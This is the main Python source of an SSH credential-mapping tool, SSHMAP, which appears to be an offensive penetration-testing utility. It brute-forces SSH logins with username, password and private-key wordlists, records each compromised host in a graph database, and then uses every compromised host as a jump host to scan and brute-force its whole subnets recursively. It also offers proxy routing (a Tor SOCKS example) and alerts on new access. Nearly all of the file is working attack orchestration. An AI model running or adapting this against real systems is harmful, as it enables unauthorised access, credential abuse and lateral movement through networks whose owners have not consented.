import argparse
import asyncio
import os
import sys
import select
import termios
import threading
import tty
from modules import bruteforce, graphdb
from modules.attempt_store import AttemptStore
from modules.logger import adjust_log_verbosity, sshmap_logger, setup_debug_logging
from modules.helpers.logger import highlight
from modules.config import CONFIG
from modules.utils import (
    get_local_info,
    get_remote_ip,
    read_targets,
    check_open_port,
    get_all_ips_in_subnet,
    read_list_from_file_or_string,
    load_keys,
)
from modules.credential_store import CredentialStore
from argparse import RawTextHelpFormatter
from modules.console import nxc_console
from rich.table import Table
from rich.live import Live
from modules.SSHSessionManager import SSHSessionManager
from datetime import datetime
from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    BarColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)
import random
from modules.helpers.AsyncRandomQueue import AsyncRandomQueue
from modules.notifier import notifier


VERSION = "1.0.3"

# Setup neo4j for graph data (successful connections)
graph = graphdb.GraphDB(CONFIG["neo4j_uri"], CONFIG["neo4j_user"], CONFIG["neo4j_pass"])

# Setup SQLite for attempt logging (much faster than Neo4j for this use case)
attempt_db_path = os.path.expanduser(CONFIG.get("attempt_db_path", "output/ssh_attempts.db"))
attempt_store = AttemptStore(db_path=attempt_db_path)

start_host, start_ips = get_local_info()
ssh_ports = CONFIG["ssh_ports"]
# Max depth for the ssh scan
max_depth = CONFIG["max_depth"]
# Thread-safe function to handle a target

# Date of running
currenttime = datetime.now().strftime("%Y%m%d_%H%M%S")

console = nxc_console
visited_attempts = set()
hosts_compromised_count = 0


progress = Progress(
    SpinnerColumn(),
    TextColumn("[bold]{task.fields[jump_host]}{task.fields[status]}", justify="right"),
    BarColumn(),
    "[{task.completed}/{task.total}]",
    TimeElapsedColumn(),
    TimeRemainingColumn(),
    transient=True,
)


class ScanPauseController:
    """Controls pause/resume state for scan workers."""

    def __init__(self):
        self.run_event = threading.Event()
        self.run_event.set()
        self.stop_event = threading.Event()
        self._lock = threading.Lock()
        self._progress = None
        self._task_ids = None
        self._blocked_jumphosts = set()
        self._pending_block_requests = []

    def bind_progress(self, progress_instance, task_ids):
        self._progress = progress_instance
        self._task_ids = task_ids

    def is_paused(self):
        return not self.run_event.is_set()

    def status_label(self):
        return " [PAUSED]" if self.is_paused() else ""

    def _update_progress_status(self):
        if self._progress is None or self._task_ids is None:
            return

        status = self.status_label()
        for task_id in self._task_ids.values():
            self._progress.update(task_id, status=status)

    def toggle(self):
        with self._lock:
            if self.run_event.is_set():
                self.run_event.clear()
                self._update_progress_status()
                sshmap_logger.highlight(
                    "[PAUSED] Scan paused. In-flight attempts will finish, new targets are paused. Press 'p' to resume."
                )
            else:
                self.run_event.set()
                self._update_progress_status()
                sshmap_logger.success("Scan resumed.")

    def request_block_jumphost(self, jump_host):
        jump_host = (jump_host or "").strip()
        if not jump_host:
            return False
        with self._lock:
            if jump_host in self._blocked_jumphosts:
                return False
            self._blocked_jumphosts.add(jump_host)
            self._pending_block_requests.append(jump_host)
        return True

    def request_unblock_jumphost(self, jump_host):
        jump_host = (jump_host or "").strip()
        if not jump_host:
            return False
        with self._lock:
            if jump_host not in self._blocked_jumphosts:
                return False
            self._blocked_jumphosts.remove(jump_host)
        return True

    def is_jumphost_blocked(self, jump_host):
        if not jump_host:
            return False
        with self._lock:
            return jump_host in self._blocked_jumphosts

    def drain_block_requests(self):
        with self._lock:
            pending = list(self._pending_block_requests)
            self._pending_block_requests.clear()
            return pending

    async def wait_if_paused(self):
        while not self.run_event.is_set():
            await asyncio.sleep(0.2)


def start_pause_key_listener(controller):
    """Start a background listener for single-key pause/resume hotkey."""
    if not sys.stdin.isatty():
        sshmap_logger.info(
            "Interactive pause hotkey disabled (stdin is not a TTY)."
        )
        return None

    def _listen_for_keys():
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)

        def _prompt_block_host():
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            sys.stdout.write("\nEnter jumphost to block (blank to cancel): ")
            sys.stdout.flush()
            jump_host = sys.stdin.readline().strip()
            tty.setcbreak(fd)

            if not jump_host:
                sshmap_logger.info("Block jumphost cancelled.")
                return

            if controller.request_block_jumphost(jump_host):
                sshmap_logger.highlight(
                    f"[BLOCKED] Jumphost '{jump_host}' blocked. Queued tasks will be removed."
                )
            else:
                sshmap_logger.info(
                    f"Jumphost '{jump_host}' is already blocked."
                )

        def _prompt_unblock_host():
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            sys.stdout.write("\nEnter jumphost to unblock (blank to cancel): ")
            sys.stdout.flush()
            jump_host = sys.stdin.readline().strip()
            tty.setcbreak(fd)

            if not jump_host:
                sshmap_logger.info("Unblock jumphost cancelled.")
                return

            if controller.request_unblock_jumphost(jump_host):
                sshmap_logger.success(
                    f"[UNBLOCKED] Jumphost '{jump_host}' unblocked. New tasks can run again."
                )
            else:
                sshmap_logger.info(
                    f"Jumphost '{jump_host}' is not currently blocked."
                )

        try:
            tty.setcbreak(fd)
            while not controller.stop_event.is_set():
                ready, _, _ = select.select([sys.stdin], [], [], 0.2)
                if not ready:
                    continue
                key = sys.stdin.read(1)
                if key and key.lower() == "p":
                    controller.toggle()
                elif key and key.lower() == "k":
                    _prompt_block_host()
                elif key and key.lower() == "u":
                    _prompt_unblock_host()
                elif key == "+":
                    verbosity = adjust_log_verbosity(1)
                    sshmap_logger.display(f"Log verbosity increased to {verbosity}.")
                elif key == "-":
                    verbosity = adjust_log_verbosity(-1)
                    sshmap_logger.display(f"Log verbosity decreased to {verbosity}.")
        except Exception as e:
            sshmap_logger.debug(f"Pause hotkey listener stopped: {e}")
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

    listener_thread = threading.Thread(
        target=_listen_for_keys,
        name="scan-pause-listener",
        daemon=True,
    )
    listener_thread.start()
    sshmap_logger.display("Hotkeys: 'p' pause/resume, 'k' block jumphost, 'u' unblock jumphost, '+' more logs, '-' fewer logs.")
    return listener_thread


async def handle_target(
    target,
    maxworkers_ssh,
    credential_store,
    current_depth,
    jump=None,
    jump_host=None,
    queue=None,
    blacklist_ips=None,
    whitelist_ips=None,
    progress=None,
    task_ids=None,
    ssh_session_manager=None,
    max_retries=3,
    force_rescan=False,
    force_targets_mode=False,
    force_targets_ips=None,
    proxy_url=None,
    pause_controller=None,
    scan_origin_host=None,
    record_closed_port_attempts=False,
):
    try:
        if scan_origin_host is None:
            scan_origin_host = start_host

        if jump is not None and jump_host is None:
            try:
                jump_host = jump.get_remote_hostname()
            except Exception:
                jump_host = None

        if current_depth > max_depth:
            sshmap_logger.debug(f"Max depth {max_depth} reached. Skipping {target}")
            return
        source_host = jump_host if jump_host else scan_origin_host
        if jump is not None:
            sshmap_logger.info(
                f"New handle_target with target:{target} with jump {jump} and current depth {current_depth} starting from {source_host}"
            )
        else:
            sshmap_logger.info(
                f"New handle_target with target:{target} and current depth {current_depth} , starting from {source_host}"
            )

        for port in ssh_ports:
            sshmap_logger.debug(f"Scanning {target} port {port}.")
            # We can not check open ports if we are using a jump host OR a proxy, so we just try to connect to all ports
            port_check_executed = False
            if current_depth > 1 or proxy_url:
                port_is_open_or_forced = True
                sshmap_logger.debug(
                    f"[{target}:{port}] check_open_port skipped (jump/proxy path)."
                )
            else:
                skip_check_open_port = False
                if (
                    not force_rescan
                    and CONFIG.get("record_connection_attempts", True)
                    and source_host
                ):
                    try:
                        candidate_credentials = credential_store.get_credentials_host_and_bruteforce(target, port)
                        attempted_set = (
                            attempt_store.get_attempted_credentials(source_host, target, port)
                            or set()
                        )
                        if ("_portcheck", "port_closed", "closed") in attempted_set:
                            sshmap_logger.debug(
                                f"[{target}:{port}] skipping target port (previous closed-port marker from {source_host})."
                            )
                            continue
                        all_attempted = all(
                            (cred.user, cred.method, cred.secret) in attempted_set
                            for cred in candidate_credentials
                        )
                        if all_attempted:
                            sshmap_logger.debug(
                                f"[{target}:{port}] all credentials already attempted from {source_host}; skipping check_open_port and running fallback/reuse path."
                            )
                            skip_check_open_port = True
                            port_is_open_or_forced = True
                    except Exception as e:
                        sshmap_logger.debug(
                            f"[{target}:{port}] attempt-history pre-check failed ({type(e).__name__}: {e}); falling back to check_open_port."
                        )

                if not skip_check_open_port:
                    port_check_executed = True
                    port_is_open_or_forced = await check_open_port(target, port)
                    sshmap_logger.debug(
                        f"[{target}:{port}] check_open_port executed={port_check_executed}, result={port_is_open_or_forced}"
                    )

            if port_is_open_or_forced:
                sshmap_logger.debug(
                    f"[{target}] Port {port} is open, starting bruteforce..."
                )
                results = await bruteforce.try_all(
                    target,
                    port,
                    maxworkers_ssh,
                    jump,
                    credential_store,
                    ssh_session_manager,
                    max_retries,
                    graphdb=graph,
                    attempt_store=attempt_store,
                    source_hostname=source_host,
                    force_rescan=force_rescan,
                    proxy_url=proxy_url,
                )
                for res in results:
                    if res.ssh_session:
                        # SSHSession object inside res
                        ssh_conn = res.get_ssh_connection()
                        # Add the target to the graph
                        # Get the remote hostname and IPs
                        sshmap_logger.debug(
                            f"[{target}:{port}] Get remote hostname and IPs"
                        )
                        # Use the hostname that was already retrieved during connection
                        remote_hostname = ssh_conn.get_remote_hostname()
                        try:
                            remote_ips = await get_remote_ip(ssh_conn)
                        except Exception as e:
                            sshmap_logger.warning(
                                f"[{target}:{port}] Failed to collect remote IPs for {remote_hostname}: {type(e).__name__}: {e}. Using target IP fallback."
                            )
                            remote_ips = [{"ip": target, "mask": 32}]

                        sshmap_logger.debug(
                            f"[{target}:{port}] Add target to database: {res.user}@{target} using {res.method}"
                        )
                        sshmap_logger.debug(
                            f"[{target}:{port}] Net info target: {remote_hostname} with IPs: {remote_ips}"
                        )
                        graph.add_host(remote_hostname, remote_ips)

                        sshmap_logger.info(
                            f"[{target}:{port}] Add SSH connection {source_host}->{remote_hostname} with creds:{res.user}:{res.creds}"
                        )
                        graph.add_ssh_connection(
                            from_hostname=source_host,
                            to_hostname=remote_hostname,
                            user=res.user,
                            method=res.method,
                            creds=res.creds,
                            ip=target,
                            port=port,
                        )
                        sshmap_logger.success(
                            f"[{target}:{port}] Successfully added SSH connection from {source_host} to {remote_hostname} with user {res.user}"
                        )
                        global hosts_compromised_count
                        hosts_compromised_count += 1
                        notifier.notify_new_access(
                            source_host=source_host,
                            remote_host=remote_hostname,
                            user=res.user,
                            method=res.method,
                            creds=res.creds,
                            ip=target,
                            port=port,
                        )
                        # keys_found = key_scanner.find_keys(ssh_conn)
                        # logger.info(f"[{target}] Keys found: {keys_found}")
                        # I need to create new jobs only if i have not used this jump before
                        if (
                            remote_hostname not in visited_attempts
                            and current_depth < max_depth
                            and remote_hostname != start_host
                        ):
                            sshmap_logger.display(
                                f"[depth:{current_depth}] New jumphost found: {remote_hostname}, starting recursive scan"
                            )
                            visited_attempts.add(remote_hostname)
                            notifier.notify_new_jumphost(
                                host=remote_hostname,
                                depth=current_depth,
                                source_host=source_host,
                            )
                            
                            # In force_targets_mode, use the force_targets_ips instead of discovering from remote host
                            if force_targets_mode and force_targets_ips:
                                # Use same targets for recursive scan, remove duplicates for consistency
                                new_targets = list(set(force_targets_ips))
                            else:
                                new_targets = []
                                for remote_ip_cidr in remote_ips:
                                    new_targets.extend(
                                        get_all_ips_in_subnet(
                                            remote_ip_cidr["ip"], remote_ip_cidr["mask"]
                                        )
                                    )
                                # Create a progress task for the new remote_hostname
                                # remove duplicated targets
                                new_targets = list(set(new_targets))
                                # remove blacklisted ips
                                new_targets = [
                                    ip for ip in new_targets if ip not in blacklist_ips
                                ]
                                # filter by whitelist if provided
                                if whitelist_ips:
                                    new_targets = [
                                        ip for ip in new_targets if ip in whitelist_ips
                                    ]
                            # tests with 4 ips only, for docker tests
                            """
                            new_targets = [
                                "172.19.0.2",
                                "172.19.0.3",
                                "172.19.0.4",
                                "172.19.0.5",
                                "172.19.0.106",
                                "172.19.0.107",
                            ]
                            """
                            if progress and remote_hostname not in task_ids:
                                task_ids[remote_hostname] = progress.add_task(
                                    description=f"Scanning {remote_hostname}",
                                    total=len(new_targets),
                                    jump_host=remote_hostname,
                                    status=pause_controller.status_label() if pause_controller else "",
                                    visible=False,
                                )
                            sshmap_logger.info(
                                f"Curent-depth: {current_depth}, scaning from: {source_host} We create a recursive job, using remote_hostname: {remote_hostname} as the jump, loaded {len(new_targets)} new targets"
                            )

                            if pause_controller and pause_controller.is_jumphost_blocked(source_host):
                                sshmap_logger.warning(
                                    f"Skipping enqueue of {len(new_targets)} recursive targets from blocked jumphost {source_host}."
                                )
                                continue

                            for new_target in new_targets:
                                await queue.put(
                                    (new_target, current_depth + 1, remote_hostname)
                                )
                        else:
                            sshmap_logger.info(
                                f"Already scanned from {remote_hostname}. Skipping."
                            )
            else:
                sshmap_logger.debug(
                    f"[{target}] No open ports found, skipping bruteforce."
                )
                if record_closed_port_attempts and source_host:
                    try:
                        await attempt_store.record_attempt(
                            source_hostname=source_host,
                            target_hostname=target,
                            target_ip=target,
                            target_port=port,
                            username="_portcheck",
                            method="port_closed",
                            credential="closed",
                            success=False,
                        )
                        sshmap_logger.debug(
                            f"[{target}:{port}] Recorded closed-port attempt marker for {source_host}."
                        )
                    except Exception as e:
                        sshmap_logger.debug(
                            f"[{target}:{port}] Failed to record closed-port marker: {type(e).__name__}: {e}"
                        )

        sshmap_logger.info(f"[{target}] Bruteforce completed successfully from {source_host} with jump {jump if jump else 'None'}.")
        return
    except asyncio.CancelledError:
        sshmap_logger.error(f"{target} was cancelled in handle target.")
        raise


async def worker(queue, semaphore, maxworkers, credential_store, blacklist_ips, whitelist_ips, force_targets_mode=False, force_targets_ips=None, proxy_url=None):
    while True:
        try:
            target, depth, queued_jump = await queue.get()

            if queued_jump is not None and hasattr(queued_jump, "get_remote_hostname"):
                jumper = queued_jump
                jump_host = queued_jump.get_remote_hostname()
            else:
                jumper = None
                jump_host = queued_jump

            async with semaphore:
                await handle_target(
                    target,
                    maxworkers,
                    credential_store,
                    current_depth=depth,
                    jump=jumper,
                    jump_host=jump_host,
                    queue=queue,
                    blacklist_ips=blacklist_ips,
                    whitelist_ips=whitelist_ips,
                    force_targets_mode=force_targets_mode,
                    force_targets_ips=force_targets_ips,
                    proxy_url=proxy_url,
                )

        except asyncio.CancelledError:
            break
        finally:
            queue.task_done()


async def async_main(args):
    setup_debug_logging()
    sshmap_logger.display(f"Using attempt store DB: {attempt_db_path}")
    credential_store = CredentialStore(args.credentialspath)
    targets = read_targets(args.targets)

    users = read_list_from_file_or_string(args.users)
    passwords = read_list_from_file_or_string(args.passwords)
    # Convert keyfile paths to absolute paths
    keyfiles = load_keys(args.keys)

    for user in users:
        for password in passwords:
            await credential_store.store("_bruteforce", 22, user, password, "password")
        for keyfile in keyfiles:
            await credential_store.store("_bruteforce", 22, user, keyfile, "keyfile")
    # Preload keys from the directory

    graph.add_host(start_host, start_ips)

    # Initialize filtering variables
    blacklist_ips = []
    whitelist_ips = None
    force_targets_ips = None
    
    # Handle force-targets mode: only scan exact IPs specified, enables recursive scanning with same targets
    force_targets_mode = False
    if args.force_targets:
        force_targets_mode = True
        new_targets = read_targets(args.force_targets)
        force_targets_ips = new_targets  # Store for recursive scans
        sshmap_logger.display(
            f"Force targets mode enabled - scanning {len(new_targets)} specified targets with recursive discovery using same targets"
        )
    else:
        blacklist_ips = read_targets(args.blacklist) if args.blacklist else []
        whitelist_ips = read_targets(args.whitelist) if args.whitelist else None
        
        # filter targets based on whitelist and blacklist
        if whitelist_ips:
            # if whitelist is provided, only scan IPs in the whitelist
            new_targets = [ip for ip in targets if ip in whitelist_ips and ip not in blacklist_ips]
        else:
            # otherwise, just remove blacklisted IPs
            new_targets = [ip for ip in targets if ip not in blacklist_ips]
    
    if args.force_rescan:
        sshmap_logger.display("Force rescan enabled - retrying all connection attempts including previously attempted ones.")
    else:
        sshmap_logger.display("Smart scanning enabled - skipping already-attempted connections. Use --force-rescan to retry all.")
    
    sshmap_logger.display(
        f"Starting attack on {len(new_targets)} targets with max depth {max_depth}"
    )
    # Initialize SSHSSessionManager
    ssh_session_manager = SSHSessionManager(
        graphdb=graph, credential_store=credential_store, proxy_url=args.proxy
    )

    # Handle --start-from option to start scanning from a remote host
    initial_jump_host = start_host
    initial_jump_session = None
    if args.start_from:
        # Verify the remote host exists in the graph database
        remote_host_info = graph.get_host(args.start_from)
        if not remote_host_info:
            sshmap_logger.error(
                f"Remote host '{args.start_from}' not found in graph database. "
                f"Please run a scan first to discover this host."
            )
            return
        
        sshmap_logger.display(
            f"Starting scan from remote host: {args.start_from}"
        )
        
        # Get SSH session to the remote host
        try:
            initial_jump_session = await ssh_session_manager.get_session(
                args.start_from, start_host
            )
            initial_jump_host = args.start_from
            sshmap_logger.success(
                f"Successfully connected to remote host: {args.start_from}"
            )
        except (ConnectionError, TimeoutError, OSError) as e:
            sshmap_logger.error(
                f"Failed to establish SSH session to {args.start_from}: {e}"
            )
            return
        except Exception as e:
            # Catch-all for unexpected errors (e.g., from asyncssh or graph database)
            sshmap_logger.error(
                f"Unexpected error connecting to {args.start_from}: {e}"
            )
            return

    # Launch multiple tasks concurrently for all targets
    queue = AsyncRandomQueue(randomize=not args.ordered_targets)
    task_ids = {}
    active_task_counts = {}
    pause_controller = ScanPauseController()
    pause_listener = start_pause_key_listener(pause_controller)
    scan_origin_host = initial_jump_host
    if args.ordered_targets:
        sshmap_logger.display(
            "Ordered target mode enabled - preserving target insertion order."
        )
    else:
        random.shuffle(new_targets)

    initial_queue_jump = initial_jump_host
    for target in new_targets:
        await queue.put((target, 1, initial_queue_jump))

    with Live(progress, console=console, refresh_per_second=10):

        # Add a task per initial jump host (in this case, just one unless more logic added)
        task_ids[initial_jump_host] = progress.add_task(
            description=f"Scanning from {initial_jump_host}",
            total=len(new_targets),
            jump_host=initial_jump_host,
            status=pause_controller.status_label(),
            visible=False,
        )
        pause_controller.bind_progress(progress, task_ids)

        semaphore = asyncio.Semaphore(args.maxworkers)

        async def tracked_worker():
            nonlocal initial_jump_session
            while True:
                has_task = False
                active_progress_host = None
                try:
                    await pause_controller.wait_if_paused()

                    pending_block_requests = pause_controller.drain_block_requests()
                    for blocked_host in pending_block_requests:
                        removed_count = await queue.drop_by_jumphost(blocked_host)
                        sshmap_logger.warning(
                            f"[BLOCKED] Removed {removed_count} queued task(s) for jumphost '{blocked_host}'."
                        )
                        if blocked_host in task_ids:
                            task_id = task_ids[blocked_host]
                            task_obj = progress.tasks[task_id]
                            if task_obj.total is not None:
                                new_total = max(int(task_obj.total) - removed_count, int(task_obj.completed))
                                progress.update(task_id, total=new_total)

                    target, depth, queued_jump = await queue.get()
                    has_task = True

                    if queued_jump is not None and hasattr(queued_jump, "get_remote_hostname"):
                        jumper = queued_jump
                        jump_host = queued_jump.get_remote_hostname()
                    else:
                        jumper = None
                        jump_host = queued_jump

                    current_jump = jump_host if jump_host else initial_jump_host

                    if current_jump in task_ids:
                        active_progress_host = current_jump
                        active_task_counts[current_jump] = active_task_counts.get(current_jump, 0) + 1
                        progress.update(task_ids[current_jump], visible=True)

                    if jump_host and pause_controller.is_jumphost_blocked(jump_host):
                        sshmap_logger.warning(
                            f"[BLOCKED] Skipping target {target} for blocked jumphost '{jump_host}'."
                        )
                        if current_jump in task_ids:
                            progress.update(task_ids[current_jump], advance=1)
                        continue

                    if jump_host and jumper is None:
                        if depth == 1 and initial_jump_session is None and jump_host == initial_jump_host:
                            pass
                        else:
                            if jump_host == initial_jump_host and initial_jump_session is not None:
                                try:
                                    if await initial_jump_session.is_connected():
                                        jumper = initial_jump_session
                                except Exception as e:
                                    sshmap_logger.debug(
                                        f"Could not validate initial jump session for {jump_host}: {type(e).__name__}: {e}"
                                    )

                            if jumper is None:
                                reconnect_from = start_host if jump_host == initial_jump_host else scan_origin_host
                                sshmap_logger.info(
                                    f"Resolving jump session for {jump_host} from {reconnect_from}"
                                )
                                jumper = await ssh_session_manager.get_session(
                                    jump_host, reconnect_from
                                )
                                if jump_host == initial_jump_host:
                                    initial_jump_session = jumper

                            if jumper is None:
                                sshmap_logger.warning(
                                    f"Unable to establish jump session for {jump_host}; skipping target {target}."
                                )
                                if current_jump in task_ids:
                                    progress.update(task_ids[current_jump], advance=1)
                                continue

                    await pause_controller.wait_if_paused()

                    async with semaphore:
                        await handle_target(
                            target,
                            args.maxworkers_ssh,
                            credential_store,
                            depth,
                            jumper,
                            jump_host,
                            queue,
                            blacklist_ips if not force_targets_mode else [],
                            whitelist_ips if not force_targets_mode else None,
                            progress,
                            task_ids,
                            ssh_session_manager,
                            args.max_retries,
                            args.force_rescan,
                            force_targets_mode,
                            force_targets_ips,
                            proxy_url=args.proxy,
                            pause_controller=pause_controller,
                            scan_origin_host=scan_origin_host,
                            record_closed_port_attempts=args.record_closed_port_attempts,
                        )

                    if current_jump in task_ids:
                        progress.update(task_ids[current_jump], advance=1)
                except asyncio.CancelledError:
                    break
                finally:
                    if has_task:
                        await queue.task_done()
                    if active_progress_host is not None:
                        active_task_counts[active_progress_host] = max(
                            0, active_task_counts.get(active_progress_host, 1) - 1
                        )
                        if active_task_counts[active_progress_host] == 0:
                            active_task_counts.pop(active_progress_host, None)
                            if active_progress_host in task_ids:
                                progress.update(task_ids[active_progress_host], visible=False)

        workers = [
            asyncio.create_task(tracked_worker()) for _ in range(args.maxworkers)
        ]

        try:
            await queue.join()
        except KeyboardInterrupt:
            sshmap_logger.warn("Ctrl+C received! Cancelling...")
        finally:
            pause_controller.stop_event.set()
            if pause_listener and pause_listener.is_alive():
                pause_listener.join(timeout=0.5)
            for w in workers:
                w.cancel()
            await asyncio.gather(*workers, return_exceptions=True)
            graph.close()

        print_jumphosts(visited_attempts)
    
    sshmap_logger.success("Closing all SSH sessions and connections.")
    await ssh_session_manager.close_all()
    sshmap_logger.success("All tasks completed.")
    notifier.notify_scan_complete(
        targets_count=len(new_targets),
        hosts_found=hosts_compromised_count,
        depth=max_depth,
    )


def print_jumphosts(visited_attempts):
    """
    Prints the jumphostnames used from the visited_attempts set in a beautiful way.
    """

    # Create a table to display the jumphostnames
    table = Table(title="Jumphosts Used")
    table.add_column("Index", justify="right")
    table.add_column("Jumphostname", justify="left")

    # Add jumphostnames to the table
    for idx, jumphost in enumerate(visited_attempts, start=1):
        table.add_row(str(idx), jumphost)

    # Print the table
    console.print(table)


def main():

    parser = argparse.ArgumentParser(
        description=rf"""
    ███████╗███████╗██╗  ██╗███╗   ███╗ █████╗ ██████╗
    ██╔════╝██╔════╝██║  ██║████╗ ████║██╔══██╗██╔══██╗
    ███████╗███████╗███████║██╔████╔██║███████║██████╔╝
    ╚════██║╚════██║██╔══██║██║╚██╔╝██║██╔══██║██╔═══╝
    ███████║███████║██║  ██║██║ ╚═╝ ██║██║  ██║██║
    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝


        SSH Credential Mapper - SSHMAP
        Navigating the Maze of Access...

        {highlight('Version', 'red')} : {highlight(VERSION)}
    """,
        formatter_class=RawTextHelpFormatter,
    )
    parser.add_argument(
        "--proxy",
        help="SOCKS5/HTTP proxy URL (e.g., socks5://127.0.0.1:9050)",
        default=None
    )
    
    parser.add_argument(
        "--targets", required=True, help="Path to the file with target IPs or a direct IP/CIDR string"
    )
    parser.add_argument(
        "--blacklist", required=False, help="Path to the file with IPs to ignore"
    )
    parser.add_argument(
        "--whitelist", required=False, help="Path to the file with IPs or CIDRs that are the only IPs that can be scanned"
    )
    parser.add_argument(
        "--force-targets", required=False, help="Path to the file with IPs or CIDRs that are the ONLY targets to scan (ignores whitelist/blacklist, uses same targets for recursive scans)"
    )
    parser.add_argument(
        "--users",
        default="wordlists/users.txt",
        help="Path to the file with usernames OR a single username",
    )
    parser.add_argument(
        "--passwords",
        default="wordlists/passwords.txt",
        help="Path to the file with passwords OR a single password",
    )
    parser.add_argument(
        "--credentialspath",
        default="wordlists/credentials.csv",
        help="Path to CSV credentials file, will populate users and passwords, keyfiles uses relative paths",
    )
    parser.add_argument(
        "--keys",
        default="wordlists/keys/",
        help="Path to directory with SSH private keys",
    )
    parser.add_argument(
        "--maxworkers",
        type=int,
        default=100,
        help="Number of workers for concurrent IP attack",
    )
    parser.add_argument(
        "--ordered-targets",
        action="store_true",
        help="Scan targets in the provided order instead of randomizing the queue",
    )
    parser.add_argument(
        "--maxworkers-ssh",
        type=int,
        default=25,
        help="Number of workers for ssh user:password try",
    )
    parser.add_argument(
        "--max-retries",
        type=int,
        default=3,
        help="Maximum number of retries for transient connection failures",
    )
    parser.add_argument("--maxdepth", type=int, default=5, help="Max depth of the scan")
    parser.add_argument(
        "--force-rescan",
        action="store_true",
        help="Force retry of already-attempted connections (ignore attempt history)",
    )
    parser.add_argument(
        "--record-closed-port-attempts",
        action="store_true",
        help="Record a synthetic attempt marker when target SSH port is closed",
    )
    parser.add_argument(
        "--debug", action="store_true", help="enable debug level information"
    )
    parser.add_argument("--verbose", action="store_true", help="enable verbose output")
    parser.add_argument("--log", action="store_true", help="enable logging to file")
    parser.add_argument(
        "--log-file",
        default=f"{currenttime}_SSHMAP_SCAN.log",
        help="Path to the log file",
    )
    parser.add_argument(
        "--start-from",
        type=str,
        default=None,
        help="Start scanning from a specific remote hostname (must exist in graphdb)",
    )

    ntfy_group = parser.add_argument_group(
        "ntfy notifications",
        "Send push notifications to an ntfy server (https://ntfy.sh or self-hosted).\n"
        "Can also be configured via ~/.sshmap/config.yml (ntfy_url / ntfy_topic / ntfy_token)."
    )
    ntfy_group.add_argument(
        "--ntfy-url",
        default=None,
        help="ntfy server URL, e.g. https://ntfy.sh or http://localhost:8080",
    )
    ntfy_group.add_argument(
        "--ntfy-topic",
        default=None,
        help="ntfy topic to publish to (e.g. sshmap-alerts)",
    )
    ntfy_group.add_argument(
        "--ntfy-token",
        default=None,
        help="Optional Bearer token for protected ntfy topics",
    )

    args = parser.parse_args()
    global max_depth
    max_depth = args.maxdepth

    # Configure ntfy notifier: CLI args take priority over config.yml
    _ntfy_url   = args.ntfy_url   or CONFIG.get("ntfy_url", "")
    _ntfy_topic = args.ntfy_topic or CONFIG.get("ntfy_topic", "")
    _ntfy_token = args.ntfy_token or CONFIG.get("ntfy_token", "")
    if _ntfy_url and _ntfy_topic:
        notifier.configure(url=_ntfy_url, topic=_ntfy_topic, token=_ntfy_token)

    if args.log:
        # Set up logging to a file
        log_file = args.log_file
        sshmap_logger.add_file_log(log_file)
        sshmap_logger.display(f"Logging to file: {log_file}")

    sshmap_logger.debug("Starting async_main with args: %s", args)
    # Check if Neo4J database is running
    try:
        graph.driver.verify_connectivity()
    except Exception as e:
        sshmap_logger.error(
            f"Neo4J connectivity check failed, check if it is running: {e}"
        )
        return
    asyncio.run(async_main(args))


if __name__ == "__main__":
    if sys.platform.startswith("win"):
        # Fix for Windows Proactor loop shutdown issues
        import asyncio.windows_events

        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    try:
        main()
    except KeyboardInterrupt:
        sshmap_logger.error("Ctrl+C received! Exiting...")
